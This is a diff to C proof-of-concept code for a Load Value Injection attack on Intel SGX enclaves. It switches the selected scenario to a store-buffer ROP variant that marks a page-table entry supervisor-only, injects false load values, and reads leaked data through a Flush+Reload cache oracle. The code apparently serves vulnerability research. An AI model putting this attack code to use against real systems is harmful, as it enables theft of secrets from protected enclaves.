@@ -35,12 +35,11 @@
 
 /* XXX select attack scenario below */
 #define LVI_SB                  0
-#define LVI_L1D                 1
-#define LVI_SB_ROP              0
-#define LVI_L1D_ROP             0
+#define LVI_L1D                 0
+#define LVI_SB_ROP              1
 
 char __attribute__((aligned(0x1000))) oracle[256 * 4096];
-char __attribute__((aligned(0x1000))) user_page[4096*64];
+char __attribute__((aligned(0x1000))) user_page[4096];
 void *enclave_page_a = NULL, *enclave_page_b = NULL;
 char *user_pt = user_page;
 uint64_t *pte_a = NULL, *pte_b = NULL;
@@ -82,7 +81,7 @@ void fault_handler(int signal)
 int main( int argc, char **argv )
 {
 	sgx_launch_token_t token = {0};
-	int updated = 0;
+	int updated = 0, rv;
     sgx_enclave_id_t eid = 0;
 
     /* Calculate Flush+Reload threshold */
@@ -115,6 +114,10 @@ int main( int argc, char **argv )
     pte_b = remap_page_table_level( enclave_page_b, PTE);
     print_pte(pte_b);
     pte_b_valid = *pte_b;
+
+#if LVI_SB_ROP
+    SGX_ASSERT( ecall_init_stack(eid) );
+#endif
     
     /* Inject false load values */
     mfence();
@@ -132,7 +135,8 @@ int main( int argc, char **argv )
                 *pte_b = *pte_a;
                 SGX_ASSERT( ecall_lvi_remap_l1d(eid, oracle) );
             #elif LVI_SB_ROP
-            #elif LVI_L1D_ROP
+                *pte_b = MARK_SUPERVISOR(*pte_b);
+                SGX_ASSERT( ecall_lvi_sb_rop(eid, &rv, (void*) user_pt+OFFSET, oracle) );
             #endif
         }
     }
